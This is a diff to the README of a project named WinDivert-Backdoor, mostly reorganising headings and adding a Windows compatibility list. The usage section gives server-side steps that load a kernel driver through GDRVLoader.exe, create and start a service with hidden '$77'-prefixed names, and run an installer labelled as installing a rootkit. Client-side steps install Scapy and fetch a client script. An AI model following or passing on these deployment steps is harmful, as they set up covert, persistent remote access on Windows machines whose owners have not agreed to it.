@@ -1,5 +1,8 @@
 # WinDivert-Backdoor
-## Server
+## Usage
+### Compatibility
+This project is compatible with Win7, Win8, Win10, WS2012, and WS2016
+### Server
 1. Install driver with GDRVLoader.exe </br>
 `GDRVLoader.exe C:\$77folder\$77kernel.sys` 
 3. Install service </br>
@@ -8,7 +11,7 @@
 `sc start $77service`
 6. Install rootkit </br>
 `Install.exe`
-## Client
+### Client
 1. [Install Scapy](https://scapy.readthedocs.io/en/latest/installation.html)
 2. Download client.py script
 3. Flourish
